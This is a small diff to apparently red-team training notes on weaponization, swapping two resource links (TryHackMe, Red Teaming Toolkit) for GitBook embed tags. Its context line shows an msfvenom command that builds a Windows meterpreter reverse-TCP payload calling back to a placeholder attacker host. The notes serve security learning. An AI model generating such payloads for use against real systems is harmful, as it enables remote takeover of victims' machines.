@@ -122,5 +122,5 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKING-MACHINE-IP LPORT=443
  
 ## Resources
 
-- [TryHackMe - Weaponization](https://tryhackme.com/room/weaponization)
-- [Red Teaming Toolkit - infosecn1nja](https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development)
+{% embed url="https://tryhackme.com/room/weaponization" %} TryHackMe - Weaponization {% endembed %}
+{% embed url="https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development" %} Red Teaming Toolkit - infosecn1nja {% endembed %}
